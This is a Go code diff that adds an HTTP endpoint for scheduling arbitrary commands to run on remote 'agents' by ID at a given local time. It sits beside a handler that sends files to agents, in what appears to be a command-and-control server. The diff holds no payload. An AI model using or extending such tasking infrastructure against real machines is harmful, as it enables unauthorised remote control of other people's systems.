@@ -9,6 +9,7 @@ import (
 	"path/filepath"
 	"strings"
 	"sync"
+	"time"
 
 	"taburtuai/task"
 	"taburtuai/utils"
@@ -199,4 +200,42 @@ func DownloadHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("[-] Failed to send file %s: %v\n", filePath, err)
 	}
 	log.Printf("[+] Sending file to agent: %s\n", filePath)
+}
+
+func ScheduleHandler(w http.ResponseWriter, r *http.Request) {
+	id := r.URL.Query().Get("id")
+	cmd := r.URL.Query().Get("cmd")
+	schedStr := r.URL.Query().Get("time")
+
+	if id == "" || cmd == "" || schedStr == "" {
+		http.Error(w, "Agent ID, command, and time required", http.StatusBadRequest)
+		return
+	}
+
+	// Layout lokal: YYYY-MM-DDTHH:MM:SS (tanpa zona).
+	// Contoh: 2025-03-16T14:30:00
+	layout := "2006-01-02T15:04:05"
+
+	// Parse ke local time server
+	localTime, err := time.ParseInLocation(layout, schedStr, time.Local)
+	if err != nil {
+		http.Error(w, "Invalid time format. Use YYYY-MM-DDTHH:MM:SS (local)", http.StatusBadRequest)
+		return
+	}
+
+	// Konversi local time → UTC
+	scheduleTimeUTC := localTime.UTC()
+
+	// Masukkan jadwal ke scheduler
+	task.AddScheduledTask(id, cmd, scheduleTimeUTC)
+
+	// Logging
+	log.Printf("[*] Scheduled command for agent %s at [LOCAL=%s, UTC=%s]: %s",
+		id,
+		localTime.Format("2006-01-02 15:04:05"),
+		scheduleTimeUTC.Format(time.RFC3339),
+		cmd,
+	)
+
+	fmt.Fprint(w, "Scheduled command added")
 }
